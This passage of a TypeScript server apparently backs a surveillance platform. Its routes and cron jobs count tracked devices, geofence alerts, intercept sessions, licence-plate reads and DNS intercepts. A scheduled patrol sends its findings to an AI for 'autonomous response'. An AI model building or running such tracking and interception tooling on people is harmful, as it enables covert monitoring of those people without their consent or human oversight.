app.get('/logs', async (c) => {
  const module = c.req.query('module');
  const hours = Math.min(parseInt(c.req.query('hours') || '24'), 720);
  const cutoff = new Date(Date.now() - hours * 3600000).toISOString();
  const logs = module
    ? await c.env.DB.prepare('SELECT * FROM surveillance_log WHERE module = ? AND timestamp > ? ORDER BY timestamp DESC LIMIT 500').bind(module, cutoff).all()
    : await c.env.DB.prepare('SELECT * FROM surveillance_log WHERE timestamp > ? ORDER BY timestamp DESC LIMIT 500').bind(cutoff).all();
  return c.json({ logs: logs.results || [] });
});

// ═══════════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════════

app.get('/dashboard', async (c) => {
  const db = c.env.DB;
  const cutoff24h = new Date(Date.now() - 86400000).toISOString();
  const cutoff5m = new Date(Date.now() - 300000).toISOString();
  try {
    const [devices, liveDevices, fences, alerts, towers, intercepts, cameras, plates, ips, highThreatIps, wifiNets, dnsLogs] = await Promise.all([
      db.prepare('SELECT COUNT(*) as cnt FROM tracked_devices WHERE status = ?').bind('active').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM tracked_devices WHERE last_seen > ?').bind(cutoff5m).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM geofences WHERE active = 1').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM geofence_alerts WHERE created_at > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM cell_tower_logs WHERE timestamp > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM intercept_sessions WHERE status = ?').bind('active').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM surveillance_cameras WHERE status = ?').bind('active').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM alpr_reads WHERE timestamp > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM ip_intel').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM ip_intel WHERE threat_score >= 50').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM wifi_networks').first(),
      db.prepare('SELECT COUNT(*) as cnt FROM dns_intercepts WHERE timestamp > ?').bind(cutoff24h).first(),
    ]);
    return c.json({
      timestamp: new Date().toISOString(),
      gps: { active_devices: devices?.cnt || 0, live_now: liveDevices?.cnt || 0, geofences: fences?.cnt || 0, alerts_24h: alerts?.cnt || 0 },
      cell_tower: { lookups_24h: towers?.cnt || 0 },
      active_intercept: { active_sessions: intercepts?.cnt || 0 },
      phys_surveillance: { cameras: cameras?.cnt || 0, plate_reads_24h: plates?.cnt || 0 },
      ip_intel: { total_ips: ips?.cnt || 0, high_threat: highThreatIps?.cnt || 0 },
      wifi: { networks: wifiNets?.cnt || 0 },
      dns: { intercepts_24h: dnsLogs?.cnt || 0 },
    });
  } catch (e) {
    return c.json({ error: 'Dashboard query failed', detail: String(e) }, 500);
  }
});

// ═══════════════════════════════════════════════════════════════
// AUTONOMOUS PATROL (cron-driven)
// ═══════════════════════════════════════════════════════════════

async function runAutonomousPatrol(env: Bindings) {
  const db = env.DB;
  log('info', 'Autonomous patrol started');
  const findings: string[] = [];

  try {
    // 1. Check watchlist hits in last 5 min
    const cutoff5m = new Date(Date.now() - 300000).toISOString();
    const watchlistHits = await db.prepare('SELECT * FROM alpr_reads WHERE on_watchlist = 1 AND timestamp > ?').bind(cutoff5m).all();
    if (watchlistHits.results?.length) {
      findings.push(`${watchlistHits.results.length} watchlist plate hits in last 5m`);
    }

    // 2. Check active intercepts health
    const activeSessions = await db.prepare("SELECT * FROM intercept_sessions WHERE status = 'active'").all();
    for (const s of activeSessions.results || []) {
      const startTime = new Date(s.start_time as string).getTime();
      if (Date.now() - startTime > 86400000) {
        findings.push(`Stale intercept session: ${s.session_id} (>24h)`);
      }
    }

    // 3. Check high-threat IPs seen recently
    const highThreats = await db.prepare('SELECT * FROM ip_intel WHERE threat_score >= 80 AND last_queried > ?').bind(cutoff5m).all();
    if (highThreats.results?.length) {
      findings.push(`${highThreats.results.length} high-threat IPs detected`);
    }

    // 4. Geofence alert check
    const recentAlerts = await db.prepare('SELECT COUNT(*) as cnt FROM geofence_alerts WHERE acknowledged = 0 AND created_at > ?').bind(cutoff5m).first();
    if ((recentAlerts?.cnt as number) > 0) {
      findings.push(`${recentAlerts?.cnt} unacknowledged geofence alerts`);
    }

    // 5. Notify if findings
    if (findings.length > 0) {
      log('warn', 'Patrol findings', { count: findings.length, findings });
      try {
        await env.BRAIN.fetch('https://internal/ingest', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ instance_id: 'prometheus-surveillance', role: 'assistant', content: `SURVEILLANCE PATROL: ${findings.join('. ')}`, importance: 7, tags: ['patrol', 'surveillance'] })
        });
      } catch { /* best-effort */ }

      // Notify Prometheus AI for autonomous response
      try {
        await env.PROMETHEUS_AI.fetch('https://internal/patrol/findings', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ findings, timestamp: new Date().toISOString() })
        });
      } catch { /* best-effort */ }
    }
  } catch (e) {
    log('error', 'Patrol failed', { error: String(e) });
  }
}

async function hourlyCleanup(env: Bindings) {
  const db = env.DB;
  log('info', 'Hourly cleanup started');
  try {
    const cutoff90d = new Date(Date.now() - 90 * 86400000).toISOString();
    const cutoff30d = new Date(Date.now() - 30 * 86400000).toISOString();
    await db.batch([
      db.prepare('DELETE FROM location_history WHERE timestamp < ?').bind(cutoff90d),
      db.prepare('DELETE FROM surveillance_log WHERE timestamp < ?').bind(cutoff90d),
      db.prepare('DELETE FROM dns_intercepts WHERE timestamp < ?').bind(cutoff30d),
      db.prepare('DELETE FROM cell_tower_logs WHERE timestamp < ?').bind(cutoff90d),
    ]);
  } catch (e) {
    log('error', 'Cleanup failed', { error: String(e) });
  }
}

async function dailyIntelReport(env: Bindings) {
  const db = env.DB;
  log('info', 'Daily intelligence report');
  try {
    const cutoff24h = new Date(Date.now() - 86400000).toISOString();
    const [alerts, plates, ips, sessions, towers] = await Promise.all([
      db.prepare('SELECT COUNT(*) as cnt FROM geofence_alerts WHERE created_at > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM alpr_reads WHERE timestamp > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM ip_intel WHERE last_queried > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM intercept_sessions WHERE start_time > ?').bind(cutoff24h).first(),
      db.prepare('SELECT COUNT(*) as cnt FROM cell_tower_logs WHERE timestamp > ?').bind(cutoff24h).first(),
    ]);

    const report = `DAILY SURVEILLANCE REPORT: Geofence alerts: ${alerts?.cnt || 0}, ALPR reads: ${plates?.cnt || 0}, IPs analyzed: ${ips?.cnt || 0}, Intercept sessions: ${sessions?.cnt || 0}, Cell lookups: ${towers?.cnt || 0}`;

    await env.BRAIN.fetch('https://internal/ingest', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ instance_id: 'prometheus-surveillance', role: 'assistant', content: report, importance: 7, tags: ['daily_report', 'surveillance'] })
    });
  } catch (e) {
    log('error', 'Daily report failed', { error: String(e) });
  }
}

// ═══════════════════════════════════════════════════════════════
// SCHEDULED (cron) HANDLER
// ═══════════════════════════════════════════════════════════════

async function scheduled(event: ScheduledEvent, env: Bindings, ctx: ExecutionContext) {
  const cronPattern = event.cron;
  log('info', 'Cron triggered', { cron: cronPattern });

  switch (cronPattern) {
    case '*/5 * * * *':
      // Every 5 minutes: geofence check + patrol
      ctx.waitUntil(runAutonomousPatrol(env));
      break;
    case '0 * * * *':
      // Hourly: cleanup old data
      ctx.waitUntil(hourlyCleanup(env));
      break;
    case '0 0 * * *':
      // Daily: intelligence report
      ctx.waitUntil(dailyIntelReport(env));
      break;
  }
}

// ═══════════════════════════════════════════════════════════════
// EXPORT
// ═══════════════════════════════════════════════════════════════


app.onError((err, c) => {
  if (err.message?.includes('JSON')) {
    return c.json({ error: 'Invalid JSON body' }, 400);
  }
  console.error(`[echo-prometheus-surveillance] ${err.message}`);
  return c.json({ error: 'Internal server error' }, 500);
});

app.notFound((c) => {
  return c.json({ error: 'Not found' }, 404);
});

export default { fetch: app.fetch, scheduled };
